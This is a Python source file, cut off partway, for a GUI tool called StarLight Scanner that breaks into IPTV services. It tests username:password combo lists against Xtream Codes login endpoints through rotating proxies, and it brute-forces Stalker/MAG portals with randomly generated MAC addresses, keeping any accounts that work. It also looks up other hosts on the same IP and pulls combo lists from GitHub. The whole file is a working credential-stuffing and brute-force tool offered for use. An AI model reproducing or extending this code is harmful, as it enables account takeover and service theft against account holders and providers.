"""
StarLight Scanner V3 - Desktop GUI
Modern UI with customtkinter, connection pooling, faster scanning.
Created by DELTASTB
Run: python starlight_scanner_gui.py
"""
import sys, os, subprocess

def ensure(pkg, imp=None):
    try: __import__(imp or pkg)
    except ImportError: subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

ensure("requests")
ensure("customtkinter")

import requests, json, time, random, threading, queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
from tkinter import ttk
import urllib3
urllib3.disable_warnings()

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# ============================================================
# SCANNING ENGINE
# ============================================================
XTREAM_ENDPOINTS = [
    "/player_api.php", "/api/player_api.php", "/c/player_api.php",
    "/panel_api.php", "/xui/player_api.php", "/get.php",
]
STALKER_ENDPOINTS = [
    "/server/load.php", "/stalker_portal/server/load.php",
    "/c/server/load.php", "/portal.php", "/mag/server/load.php",
    "/portal/server/load.php", "/tv/server/load.php",
    "/iptv/server/load.php", "/stb/server/load.php",
]
DEFAULT_PORTS = [80,8080,8880,8000,25461,25500,8443,8888,8001,10000,2082,2086]

_session = None
_proxy_list = []
_proxy_index = 0
_proxy_lock = threading.Lock()

def _get_next_proxy():
    """Get next proxy from rotation list. Returns None if no proxies loaded."""
    global _proxy_index
    if not _proxy_list:
        return None
    with _proxy_lock:
        proxy = _proxy_list[_proxy_index % len(_proxy_list)]
        _proxy_index += 1
    return {"http": proxy, "https": proxy}

def load_proxies(proxy_text):
    """Load proxies from text (one per line). Formats: ip:port, http://ip:port, socks5://ip:port"""
    global _proxy_list, _proxy_index
    _proxy_index = 0
    _proxy_list = []
    for line in proxy_text.strip().split("\n"):
        line = line.strip()
        if not line: continue
        if "://" not in line:
            line = f"http://{line}"
        _proxy_list.append(line)
    return len(_proxy_list)

def _get_session():
    global _session
    if _session is None:
        _session = requests.Session()
        _session.verify = False
        _session.headers.update({"User-Agent": "Mozilla/5.0"})
        a = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=200, max_retries=0)
        _session.mount("http://", a)
        _session.mount("https://", a)
    return _session

def gen_mac():
    return "00:1A:79:" + ":".join([f"{random.randint(0,255):02X}" for _ in range(3)])

def _play_cash_sound():
    """Play a cash register ka-ching sound."""
    try:
        import winsound, struct, io, math, tempfile
        sample_rate = 22050
        duration = 0.4
        samples = int(sample_rate * duration)
        audio_data = []
        for i in range(samples):
            t = i / sample_rate
            # Three ascending tones + noise burst
            tone1 = math.sin(2 * math.pi * 1567 * t) * max(0, 1 - t * 8) * 0.3 if t < 0.12 else 0
            tone2 = math.sin(2 * math.pi * 2637 * t) * max(0, 1 - (t - 0.08) * 6) * 0.3 if 0.08 < t < 0.25 else 0
            tone3 = math.sin(2 * math.pi * 3135 * t) * max(0, 1 - (t - 0.18) * 4) * 0.2 if 0.18 < t < 0.4 else 0
            noise = (random.random() * 2 - 1) * max(0, 1 - (t - 0.12) * 12) * 0.12 if 0.12 < t < 0.2 else 0
            sample = tone1 + tone2 + tone3 + noise
            audio_data.append(int(max(-1, min(1, sample)) * 32767))
        # Write WAV to temp file
        wav_path = os.path.join(tempfile.gettempdir(), "starlight_cash.wav")
        with open(wav_path, 'wb') as f:
            import wave
            wf = wave.open(f, 'w')
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sample_rate)
            wf.writeframes(struct.pack(f'<{len(audio_data)}h', *audio_data))
            wf.close()
        winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
    except Exception:
        try:
            import winsound
            winsound.Beep(2000, 150)
        except:
            pass

def check_xtream(host, port, user, pw, timeout=5):
    sess = _get_session()
    proxies = _get_next_proxy()
    for ep in XTREAM_ENDPOINTS:
        url = f"http://{host}:{port}{ep}?username={user}&password={pw}"
        try:
            r = sess.get(url, timeout=(2, timeout), allow_redirects=False, proxies=proxies)
            if r.status_code != 200: continue
            try: data = r.json()
            except: continue
            ui = data.get("user_info")
            if not ui: continue
            if str(ui.get("auth","")) != "1": continue
            if str(ui.get("status","")).lower() != "active": continue
            exp = ui.get("exp_date")
            if exp:
                try:
                    if int(exp) > 0 and int(exp) < time.time(): continue
                except: pass
            days = ""
            if exp:
                try: days = str(int((int(exp)-time.time())/86400))
                except: days = "?"
            exp_str = ""
            if exp:
                try: exp_str = datetime.fromtimestamp(int(exp)).strftime("%Y-%m-%d")
                except: exp_str = str(exp)
            mc = ui.get("max_connections","?")
            ac = ui.get("active_cons","0")
            m3u = f"http://{host}:{port}/get.php?username={user}&password={pw}&type=m3u_plus"
            return {"type":"xtream","host":host,"port":str(port),"ep":ep,
                    "user":user,"pw":pw,"exp":exp_str,"days":days,
                    "mc":str(mc),"ac":str(ac),"m3u":m3u,"proto":"http"}
        except requests.exceptions.ConnectTimeout: return None
        except requests.exceptions.ConnectionError: return None
        except: continue
    return None

def check_stalker_single(host, port, mac, timeout=8):
    sess = _get_session()
    proxies = _get_next_proxy()
    hdrs = {
        "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) MAG200 stbapp ver: 2 rev: 250",
        "Cookie":f"mac={mac}; stb_lang=en; timezone=Europe/London",
        "X-User-Agent":"Model: MAG250; Link: WiFi",
    }
    for ep in STALKER_ENDPOINTS:
        try:
            if "load.php" in ep:
                url = f"http://{host}:{port}{ep}?type=stb&action=handshake&JsHttpRequest=1-xml"
            else:
                url = f"http://{host}:{port}{ep.rstrip('/')}/server/load.php?type=stb&action=handshake&JsHttpRequest=1-xml"
            r = sess.get(url, headers=hdrs, timeout=timeout, allow_redirects=False, proxies=proxies)
            if r.status_code != 200: continue
            try: data = r.json()
            except: continue
            js = data.get("js",{})
            token = js.get("token") if isinstance(js,dict) else None
            if not token: continue
            # Get metadata
            base_ep = ep if "load.php" in ep else ep.rstrip('/') + '/server/load.php'
            base_url = f"http://{host}:{port}{base_ep}"
            hdrs2 = dict(hdrs)
            hdrs2["Authorization"] = f"Bearer {token}"
            exp_date, mc, live_count, vod_count, series_count = "", "", 0, 0, 0
            try:
                r2 = sess.get(f"{base_url}?type=stb&action=get_profile&JsHttpRequest=1-xml",
                              headers=hdrs2, timeout=timeout)
                if r2.status_code == 200:
                    pd = r2.json().get("js",{})
                    if isinstance(pd, dict):
                        exp_date = pd.get("expire_billing_date", "")
                        if not exp_date or exp_date == "0000-00-00 00:00:00": exp_date = "Unlimited"
                        mc = str(pd.get("max_con",""))
            except: pass
            try:
                r3 = sess.get(f"{base_url}?type=itv&action=get_all_channels&JsHttpRequest=1-xml",
                              headers=hdrs2, timeout=timeout)
                if r3.status_code == 200:
                    td = r3.json().get("js",{})
                    live_count = td.get("total_items", len(td.get("data",[]))) if isinstance(td, dict) else len(td) if isinstance(td, list) else 0
            except: pass
            try:
                r4 = sess.get(f"{base_url}?type=vod&action=get_ordered_list&JsHttpRequest=1-xml",
                              headers=hdrs2, timeout=timeout)
                if r4.status_code == 200:
                    vd = r4.json().get("js",{})
                    if isinstance(vd, dict): vod_count = vd.get("total_items", len(vd.get("data",[])))
            except: pass
            try:
                r5 = sess.get(f"{base_url}?type=series&action=get_ordered_list&JsHttpRequest=1-xml",
                              headers=hdrs2, timeout=timeout)
                if r5.status_code == 200:
                    sd = r5.json().get("js",{})
                    if isinstance(sd, dict): series_count = sd.get("total_items", len(sd.get("data",[])))
            except: pass
            total_content = int(live_count or 0) + int(vod_count or 0) + int(series_count or 0)
            if total_content < 1: continue
            portal = f"http://{host}:{port}{ep}"
            return {"type":"stalker","host":host,"port":str(port),"ep":ep,
                    "mac":mac,"token":token,"portal":portal,"proto":"http",
                    "exp":exp_date,"days":"","mc":mc,
                    "live":str(live_count),"vod":str(vod_count),"series":str(series_count)}
        except: continue
    return None


# ============================================================
# SIDE HOST DISCOVERY (runs in background after hits)
# ============================================================
IGNORED_DOMAINS = {
    'google.com','nginx.org','cloudflare.com','microsoft.com','amazon.com',
    'facebook.com','instagram.com','twitter.com','youtube.com','github.com',
    'wordpress.com','wikipedia.org','localhost','apple.com','netflix.com',
}

def discover_side_hosts(host, log_func=None):
    """Find other domains hosted on same IP. Returns list of host:port strings."""
    import socket
    discovered = set()
    try:
        ip = socket.gethostbyname(host)
    except:
        return []
    # Source 1: rapiddns.io (reverse IP)
    try:
        r = requests.get(f"https://rapiddns.io/sameip/{ip}?full=1", timeout=15, verify=False,
                        headers={"User-Agent":"Mozilla/5.0"})
        if r.status_code == 200:
            import re
            domains = re.findall(r'<td>([a-zA-Z0-9][\w\-\.]+\.[a-zA-Z]{2,})</td>', r.text)
            for d in domains:
                d = d.lower().strip()
                if d and d != host and not any(d.endswith(ig) for ig in IGNORED_DOMAINS):
                    discovered.add(d)
    except: pass
    # Source 2: hackertarget reverse IP
    try:
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=15,
                        headers={"User-Agent":"Mozilla/5.0"})
        if r.status_code == 200 and "error" not in r.text.lower():
            for line in r.text.strip().split("\n"):
                d = line.strip().lower()
                if d and d != host and "." in d and not any(d.endswith(ig) for ig in IGNORED_DOMAINS):
                    discovered.add(d)
    except: pass
    if log_func:
        log_func(f"Side hosts for {host}: found {len(discovered)} domains on {ip}")
    return list(discovered)[:50]  # Cap at 50


# ============================================================
# GITHUB COMBO FETCHING
# ============================================================
def fetch_github_combos():
    """Fetch combo lists from DELTAFLYER364/DeltastbCombos GitHub releases."""
    import re
    username = "DELTAFLYER364"
    repo = "DeltastbCombos"
    api_url = f"https://api.github.com/repos/{username}/{repo}/releases"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "application/vnd.github.v3+json"
    }
    combos = {}
    seen_urls = set()
    try:
        r = requests.get(api_url, headers=headers, timeout=15)
        if r.status_code == 200:
            releases = r.json()
            if isinstance(releases, list):
                for release in releases:
                    for asset in release.get("assets", []):
                        name = asset.get("name", "")
                        url = asset.get("browser_download_url")
                        if name.endswith(".txt") and url and url not in seen_urls:
                            combos[name] = url
                            seen_urls.add(url)
                    body_text = release.get("body", "")
                    if body_text:
                        for text, url in re.findall(r'\[([^\]]+)\]\((https?://[^\)]+?\.txt.*?)\)', body_text):
                            if url not in seen_urls:
                                combos[text.strip()] = url
                                seen_urls.add(url)
                        for url in re.findall(r'(https?://[^\s\)\"\']+?\.txt[^\s\)\"\']*)', body_text):
                            if url not in seen_urls:
                                filename = url.split("/")[-1].split("?")[0]
                                combos[filename] = url
                                seen_urls.add(url)
        if not combos:
            fallback_url = f"https://api.github.com/repos/{username}/{repo}/contents/"
            r_fb = requests.get(fallback_url, headers=headers, timeout=15)
            if r_fb.status_code == 200:
                items = r_fb.json()
                if isinstance(items, list):
                    for item in items:
                        name = item.get("name", "")
                        url = item.get("download_url")
                        if item.get("type") == "file" and name.endswith(".txt") and url and url not in seen_urls:
                            combos[name] = url
                            seen_urls.add(url)
    except Exception:
        pass
    return combos


# ============================================================
# GUI APPLICATION
# ============================================================
class StarlightGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("StarLight Scanner V3")
        self.geometry("1280x800")
        self.minsize(1000, 650)
        # Set custom window icon
        icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "starlight.ico")
        if os.path.exists(icon_path):
            try:
                self.iconbitmap(icon_path)
            except Exception:
                pass

        self.running_xtream = False
        self.running_stalker = False
        self.stop_xtream = False
        self.stop_stalker = False
        self.hits = []
        self.scanned_xt = 0
        self.scanned_sk = 0
        self.total_xt = 0
        self.total_sk = 0
        self.start_time = 0
        self.log_queue = queue.Queue()
        self._side_hosts_checked = set()  # Track hosts already checked for side hosts

        self._build_header()
        self._build_stats()
        self._build_tabs()
        self._build_log()
        self._poll_loop()

    def _build_header(self):
        hdr = ctk.CTkFrame(self, height=55, corner_radius=0, fg_color="#1a1a2e")
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="✨ StarLight Scanner V3", font=ctk.CTkFont(size=20, weight="bold"),
                     text_color="#a78bfa").pack(side="left", padx=20)
        ctk.CTkLabel(hdr, text="Created by DELTASTB", font=ctk.CTkFont(size=11),
                     text_color="#64748b").pack(side="left", padx=(0,10))
        self.status_label = ctk.CTkLabel(hdr, text="● IDLE", font=ctk.CTkFont(size=13, weight="bold"),
                                         text_color="#34d399")
        self.status_label.pack(side="right", padx=20)
        # Theme selector
        self.theme_var = ctk.StringVar(value="Galaxy")
        theme_menu = ctk.CTkOptionMenu(hdr, values=["Galaxy", "Cyber Neon", "Blood Red", "Ocean Blue", "Gold Elite", "Emerald"],
                                        variable=self.theme_var, width=120, height=28,
                                        font=ctk.CTkFont(size=10),
                                        fg_color="#2d1b69", button_color="#4f46e5",
                                        button_hover_color="#6366f1",
                                        command=self._change_theme)
        theme_menu.pack(side="right", padx=8)
        ctk.CTkLabel(hdr, text="Theme:", font=ctk.CTkFont(size=10),
                     text_color="#64748b").pack(side="right")

    def _change_theme(self, theme_name):
        """Apply a color theme to the entire scanner."""
        themes = {
            "Galaxy": {"bg": "#0d0d1a", "accent": "#6366f1", "accent2": "#8b5cf6", "text": "#e2e8f0", "header": "#1a1a2e"},
            "Cyber Neon": {"bg": "#0a0a0f", "accent": "#06b6d4", "accent2": "#22d3ee", "text": "#e0f2fe", "header": "#0c1222"},
            "Blood Red": {"bg": "#0f0505", "accent": "#dc2626", "accent2": "#ef4444", "text": "#fecaca", "header": "#1a0808"},
            "Ocean Blue": {"bg": "#020617", "accent": "#2563eb", "accent2": "#3b82f6", "text": "#dbeafe", "header": "#0c1629"},
            "Gold Elite": {"bg": "#0f0b04", "accent": "#d97706", "accent2": "#f59e0b", "text": "#fef3c7", "header": "#1a1208"},
            "Emerald": {"bg": "#021a0e", "accent": "#059669", "accent2": "#10b981", "text": "#d1fae5", "header": "#062e16"},
        }
        t = themes.get(theme_name, themes["Galaxy"])
        # Apply to window
        self.configure(fg_color=t["bg"])
        # Apply to tabview
        self.tabview.configure(fg_color=t["bg"])
        self._log(f"Theme changed to: {theme_name}")

    def _build_stats(self):
        sf = ctk.CTkFrame(self, height=100, fg_color="#111127", corner_radius=10)
        sf.pack(fill="x", padx=10, pady=(6,3))
        sf.pack_propagate(False)
        sf.grid_columnconfigure((0,1,2,3,4,5), weight=1)
        sf.grid_rowconfigure((0,1), weight=1)
        self.stat_labels = {}
        # Row 0: Xtream stats
        xt_stats = [("XT Targets","0","#818cf8"),("XT Scanned","0","#a78bfa"),("XT Hits","0","#34d399"),
                    ("XT Speed","0/s","#22d3ee"),("Elapsed","0:00","#fbbf24"),("ETA","...","#f87171")]
        for i,(name,val,color) in enumerate(xt_stats):
            f = ctk.CTkFrame(sf, fg_color="transparent")
            f.grid(row=0, column=i, padx=6, pady=(6,2), sticky="nsew")
            ctk.CTkLabel(f, text=name, font=ctk.CTkFont(size=9), text_color="#64748b").pack()
            lbl = ctk.CTkLabel(f, text=val, font=ctk.CTkFont(size=15, weight="bold"), text_color=color)
            lbl.pack()
            self.stat_labels[name] = lbl
        # Row 1: Stalker stats (hidden by default, shown when stalker runs)
        sk_stats = [("SK Targets","0","#818cf8"),("SK Scanned","0","#a78bfa"),("SK Hits","0","#06b6d4"),
                    ("SK Speed","0/s","#22d3ee"),("Total Hits","0","#34d399"),("","","")]
        self.sk_stat_frames = []
        for i,(name,val,color) in enumerate(sk_stats):
            f = ctk.CTkFrame(sf, fg_color="transparent")
            f.grid(row=1, column=i, padx=6, pady=(2,6), sticky="nsew")
            self.sk_stat_frames.append(f)
            if name:
                ctk.CTkLabel(f, text=name, font=ctk.CTkFont(size=9), text_color="#64748b").pack()
                lbl = ctk.CTkLabel(f, text=val, font=ctk.CTkFont(size=15, weight="bold"), text_color=color)
                lbl.pack()
                self.stat_labels[name] = lbl
        # Hide stalker row initially
        self._show_stalker_stats(False)
        # Progress bar
        self.progress = ctk.CTkProgressBar(self, height=6, corner_radius=3, progress_color="#6366f1")
        self.progress.pack(fill="x", padx=10, pady=(3,6))
        self.progress.set(0)

    def _show_stalker_stats(self, show):
        """Show or hide the stalker stats row."""
        if show:
            for f in self.sk_stat_frames:
                f.grid()
        else:
            for f in self.sk_stat_frames:
                f.grid_remove()

    def _build_tabs(self):
        self.tabview = ctk.CTkTabview(self, corner_radius=12, fg_color="#0d0d1a",
                                       segmented_button_fg_color="#1e1b4b",
                                       segmented_button_selected_color="#4f46e5",
                                       segmented_button_unselected_color="#1e1b4b")
        self.tabview.pack(fill="both", expand=True, padx=10, pady=(0,3))
        self.tabview.add("Xtream Scan")
        self.tabview.add("Stalker Scan")
        self.tabview.add("Hits")
        self.tabview.add("URLScan")
        self.tabview.add("Settings")
        self._build_xtream_tab()
        self._build_stalker_tab()
        self._build_hits_tab()
        self._build_urlscan_tab()
        self._build_settings_tab()

    def _build_xtream_tab(self):
        tab = self.tabview.tab("Xtream Scan")
        # DNS entry row
        row = ctk.CTkFrame(tab, fg_color="transparent")
        row.pack(fill="x", pady=(0,8))
        ctk.CTkLabel(row, text="DNS / Host:", font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#a5b4fc").pack(side="left")
        self.xt_dns_entry = ctk.CTkEntry(row, width=300, placeholder_text="Add host and press Enter")
        self.xt_dns_entry.pack(side="left", padx=8)
        self.xt_dns_entry.bind("<Return>", lambda e: self._add_dns())
        ctk.CTkButton(row, text="Add", width=60, command=self._add_dns,
                      fg_color="#4f46e5", hover_color="#6366f1").pack(side="left", padx=2)
        ctk.CTkButton(row, text="Load .txt", width=80, command=lambda: self._load_file(self.xt_hosts),
                      fg_color="#3730a3", hover_color="#4f46e5").pack(side="left", padx=2)
        ctk.CTkButton(row, text="Clear", width=60, command=lambda: self.xt_hosts.delete("1.0","end"),
                      fg_color="#374151", hover_color="#4b5563").pack(side="left", padx=2)
        # Two columns
        cols = ctk.CTkFrame(tab, fg_color="transparent")
        cols.pack(fill="both", expand=True)
        cols.grid_columnconfigure((0,1), weight=1)
        cols.grid_rowconfigure(0, weight=1)
        # Left - hosts
        lf = ctk.CTkFrame(cols, fg_color="#0f0f24", corner_radius=10)
        lf.grid(row=0, column=0, sticky="nsew", padx=(0,4))
        ctk.CTkLabel(lf, text="DNS Hosts (one per line)", font=ctk.CTkFont(size=11),
                     text_color="#818cf8").pack(anchor="w", padx=10, pady=(8,2))
        self.xt_hosts = ctk.CTkTextbox(lf, font=ctk.CTkFont(family="Consolas", size=11),
                                        fg_color="#080816", text_color="#e2e8f0")
        self.xt_hosts.pack(fill="both", expand=True, padx=8, pady=(0,8))
        # Right - combos
        rf = ctk.CTkFrame(cols, fg_color="#0f0f24", corner_radius=10)
        rf.grid(row=0, column=1, sticky="nsew", padx=(4,0))
        cr = ctk.CTkFrame(rf, fg_color="transparent")
        cr.pack(fill="x", padx=10, pady=(8,2))
        ctk.CTkLabel(cr, text="Combos user:pass", font=ctk.CTkFont(size=11),
                     text_color="#818cf8").pack(side="left")
        ctk.CTkButton(cr, text="Load", width=50, height=22, font=ctk.CTkFont(size=10),
                      command=lambda: self._load_file(self.xt_combos),
                      fg_color="#3730a3", hover_color="#4f46e5").pack(side="right")
        ctk.CTkButton(cr, text="Fetch GitHub", width=90, height=22, font=ctk.CTkFont(size=10),
                      command=self._fetch_github_combos,
                      fg_color="#f59e0b", hover_color="#fbbf24", text_color="#000").pack(side="right", padx=4)
        self.xt_combos = ctk.CTkTextbox(rf, font=ctk.CTkFont(family="Consolas", size=11),
                                         fg_color="#080816", text_color="#e2e8f0")
        self.xt_combos.pack(fill="both", expand=True, padx=8, pady=(0,8))
        # Buttons
        bf = ctk.CTkFrame(tab, fg_color="transparent")
        bf.pack(fill="x", pady=(8,0))
        ctk.CTkButton(bf, text="▶ START SCAN", width=160, height=38,
                      font=ctk.CTkFont(size=13, weight="bold"),
                      fg_color="#059669", hover_color="#10b981",
                      command=self.start_xtream).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="⏹ STOP XTREAM", width=140, height=38,
                      font=ctk.CTkFont(size=13, weight="bold"),
                      fg_color="#dc2626", hover_color="#ef4444",
                      command=self.stop_xtream_scan).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="⏹ STOP ALL", width=100, height=38,
                      font=ctk.CTkFont(size=12, weight="bold"),
                      fg_color="#7c2d12", hover_color="#9a3412",
                      command=self.stop_scan).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="Clear All", width=80, height=38,
                      font=ctk.CTkFont(size=12, weight="bold"),
                      fg_color="#374151", hover_color="#4b5563",
                      command=self.clear_hits).pack(side="left", padx=4)

    def _build_stalker_tab(self):
        tab = self.tabview.tab("Stalker Scan")
        row = ctk.CTkFrame(tab, fg_color="transparent")
        row.pack(fill="x", pady=(0,8))
        ctk.CTkLabel(row, text="DNS / Host:", font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#22d3ee").pack(side="left")
        self.sk_dns_entry = ctk.CTkEntry(row, width=300, placeholder_text="Add portal host")
        self.sk_dns_entry.pack(side="left", padx=8)
        self.sk_dns_entry.bind("<Return>", lambda e: self._add_stalker_dns())
        ctk.CTkButton(row, text="Add", width=60, command=self._add_stalker_dns,
                      fg_color="#0e7490", hover_color="#0891b2").pack(side="left", padx=2)
        ctk.CTkButton(row, text="Load .txt", width=80, command=lambda: self._load_file(self.sk_hosts),
                      fg_color="#3730a3", hover_color="#4f46e5").pack(side="left", padx=2)
        # MAC count
        mr = ctk.CTkFrame(tab, fg_color="transparent")
        mr.pack(fill="x", pady=(0,4))
        ctk.CTkLabel(mr, text="MACs per host:", text_color="#22d3ee",
                     font=ctk.CTkFont(size=11)).pack(side="left")
        self.sk_mac_count = ctk.CTkEntry(mr, width=80, placeholder_text="1000")
        self.sk_mac_count.insert(0, "1000")
        self.sk_mac_count.pack(side="left", padx=8)
        ctk.CTkLabel(mr, text="Current MAC:", text_color="#64748b",
                     font=ctk.CTkFont(size=10)).pack(side="left", padx=(20,4))
        self.sk_mac_label = ctk.CTkLabel(mr, text="--:--:--:--:--:--",
                                          font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
                                          text_color="#fbbf24")
        self.sk_mac_label.pack(side="left")
        # Hosts
        hf = ctk.CTkFrame(tab, fg_color="#0f0f24", corner_radius=10)
        hf.pack(fill="both", expand=True, pady=(4,8))
        ctk.CTkLabel(hf, text="Portal Hosts (one per line)", font=ctk.CTkFont(size=11),
                     text_color="#818cf8").pack(anchor="w", padx=10, pady=(8,2))
        self.sk_hosts = ctk.CTkTextbox(hf, font=ctk.CTkFont(family="Consolas", size=11),
                                        fg_color="#080816", text_color="#e2e8f0")
        self.sk_hosts.pack(fill="both", expand=True, padx=8, pady=(0,8))
        # Buttons
        bf = ctk.CTkFrame(tab, fg_color="transparent")
        bf.pack(fill="x")
        ctk.CTkButton(bf, text="▶ START STALKER", width=180, height=38,
                      font=ctk.CTkFont(size=13, weight="bold"),
                      fg_color="#0891b2", hover_color="#06b6d4",
                      command=self.start_stalker).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="⏹ STOP STALKER", width=140, height=38,
                      font=ctk.CTkFont(size=13, weight="bold"),
                      fg_color="#dc2626", hover_color="#ef4444",
                      command=self.stop_stalker_scan).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="⏹ STOP ALL", width=100, height=38,
                      font=ctk.CTkFont(size=12, weight="bold"),
                      fg_color="#7c2d12", hover_color="#9a3412",
                      command=self.stop_scan).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="Clear", width=70, height=38,
                      font=ctk.CTkFont(size=12, weight="bold"),
                      fg_color="#374151", hover_color="#4b5563",
                      command=self.clear_hits).pack(side="left", padx=4)


    def _build_hits_tab(self):
        tab = self.tabview.tab("Hits")
        # Toolbar
        tb = ctk.CTkFrame(tab, fg_color="transparent")
        tb.pack(fill="x", pady=(0,6))
        ctk.CTkButton(tb, text="Export All", width=100, fg_color="#059669", hover_color="#10b981",
                      command=self.export_hits).pack(side="left", padx=2)
        ctk.CTkButton(tb, text="Auto-Save", width=100, fg_color="#2563eb", hover_color="#3b82f6",
                      command=self.auto_save_hits).pack(side="left", padx=2)
        ctk.CTkButton(tb, text="Clear", width=70, fg_color="#dc2626", hover_color="#ef4444",
                      command=self.clear_hits).pack(side="left", padx=2)
        self.hit_count_label = ctk.CTkLabel(tb, text="0 hits",
                                             font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
                                             text_color="#34d399")
        self.hit_count_label.pack(side="right", padx=10)
        # Treeview for hits (using ttk since CTk doesn't have one)
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Hits.Treeview", background="#0d0d1e", foreground="#e2e8f0",
                        fieldbackground="#0d0d1e", rowheight=28, font=("Consolas",9))
        style.configure("Hits.Treeview.Heading", background="#1e1b4b", foreground="#a5b4fc",
                        font=("Segoe UI",9,"bold"))
        style.map("Hits.Treeview", background=[("selected","#3730a3")])
        # Xtream hits
        ctk.CTkLabel(tab, text="XTREAM HITS", font=ctk.CTkFont(size=11, weight="bold"),
                     text_color="#a78bfa").pack(anchor="w", padx=4)
        xt_frame = ctk.CTkFrame(tab, fg_color="#0d0d1e", corner_radius=8)
        xt_frame.pack(fill="both", expand=True, pady=(2,6))
        xt_cols = ("host","port","user","pass","expiry","days","mc","m3u")
        self.xt_tree = ttk.Treeview(xt_frame, columns=xt_cols, show="headings",
                                     height=6, style="Hits.Treeview")
        for c,w in [("host",130),("port",45),("user",90),("pass",90),
                    ("expiry",85),("days",45),("mc",40),("m3u",280)]:
            self.xt_tree.heading(c, text=c.upper())
            self.xt_tree.column(c, width=w, anchor="center" if w<100 else "w")
        vsb = ttk.Scrollbar(xt_frame, orient="vertical", command=self.xt_tree.yview)
        self.xt_tree.configure(yscrollcommand=vsb.set)
        self.xt_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb.pack(side="right", fill="y")
        self.xt_tree.bind("<Button-3>", self._hit_rightclick)
        self.xt_tree.bind("<Double-1>", self._xt_double_click)
        # Stalker hits
        ctk.CTkLabel(tab, text="STALKER HITS", font=ctk.CTkFont(size=11, weight="bold"),
                     text_color="#22d3ee").pack(anchor="w", padx=4)
        sk_frame = ctk.CTkFrame(tab, fg_color="#0d0d1e", corner_radius=8)
        sk_frame.pack(fill="both", expand=True, pady=(2,0))
        sk_cols = ("host","port","mac","expiry","channels","mc","portal")
        self.sk_tree = ttk.Treeview(sk_frame, columns=sk_cols, show="headings",
                                     height=6, style="Hits.Treeview")
        for c,w in [("host",130),("port",45),("mac",130),("expiry",85),
                    ("channels",110),("mc",40),("portal",280)]:
            self.sk_tree.heading(c, text=c.upper())
            self.sk_tree.column(c, width=w, anchor="center" if w<100 else "w")
        vsb2 = ttk.Scrollbar(sk_frame, orient="vertical", command=self.sk_tree.yview)
        self.sk_tree.configure(yscrollcommand=vsb2.set)
        self.sk_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb2.pack(side="right", fill="y")
        self.sk_tree.bind("<Button-3>", self._hit_rightclick)
        self.sk_tree.bind("<Double-1>", self._sk_double_click)

    def _hit_rightclick(self, event):
        tree = event.widget
        row = tree.identify_row(event.y)
        if not row: return
        tree.selection_set(row)
        vals = tree.item(row)["values"]
        menu = tk.Menu(self, tearoff=0, bg="#1e1b4b", fg="#fff", font=("Segoe UI",9))
        menu.add_command(label="Copy M3U/Portal", command=lambda: self._copy(vals[-1]))
        menu.add_command(label="Copy Host:Port", command=lambda: self._copy(f"{vals[0]}:{vals[1]}"))
        if tree == self.xt_tree:
            # Xtream-specific options
            menu.add_command(label="Copy User:Pass", command=lambda: self._copy(f"{vals[2]}:{vals[3]}"))
            m3u = self._get_full_m3u(vals)
            menu.add_separator()
            menu.add_command(label="Copy Full M3U Link", command=lambda: self._copy(m3u))
            menu.add_command(label="Open M3U in Browser", command=lambda: __import__('webbrowser').open(m3u))
            menu.add_separator()
            menu.add_command(label="Add Host to Scanner", command=lambda: self._send_host_to("xtream", f"{vals[0]}:{vals[1]}"))
        else:
            # Stalker-specific
            menu.add_command(label="Copy MAC", command=lambda: self._copy(vals[2]))
            menu.add_separator()
            menu.add_command(label="Open Portal in Browser", command=lambda: __import__('webbrowser').open(str(vals[-1])))
            menu.add_command(label="Add Host to Scanner", command=lambda: self._send_host_to("stalker", f"{vals[0]}:{vals[1]}"))
        menu.tk_popup(event.x_root, event.y_root)

    def _xt_double_click(self, event):
        """Double-click on xtream hit → copy M3U to clipboard."""
        sel = self.xt_tree.selection()
        if sel:
            vals = self.xt_tree.item(sel[0])["values"]
            m3u = self._get_full_m3u(vals)
            self._copy(m3u)
            self._log(f"Copied M3U: {m3u[:60]}...")

    def _sk_double_click(self, event):
        """Double-click on stalker hit → copy portal URL to clipboard."""
        sel = self.sk_tree.selection()
        if sel:
            vals = self.sk_tree.item(sel[0])["values"]
            portal = str(vals[-1])
            self._copy(portal)
            self._log(f"Copied Portal: {portal}")

    def _get_full_m3u(self, vals):
        """Reconstruct full M3U URL from treeview row values."""
        # vals = (host, port, user, pass, expiry, days, mc, m3u_truncated)
        host, port, user, pw = str(vals[0]), str(vals[1]), str(vals[2]), str(vals[3])
        return f"http://{host}:{port}/get.php?username={user}&password={pw}&type=m3u_plus"

    def _copy(self, text):
        self.clipboard_clear()
        self.clipboard_append(str(text))

    def _build_urlscan_tab(self):
        tab = self.tabview.tab("URLScan")
        sr = ctk.CTkFrame(tab, fg_color="transparent")
        sr.pack(fill="x", pady=(0,6))
        ctk.CTkLabel(sr, text="Search:", font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#f59e0b").pack(side="left")
        self.us_query = ctk.CTkEntry(sr, width=350, placeholder_text='page.url:"player_api.php"')
        self.us_query.insert(0, 'page.url:"player_api.php"')
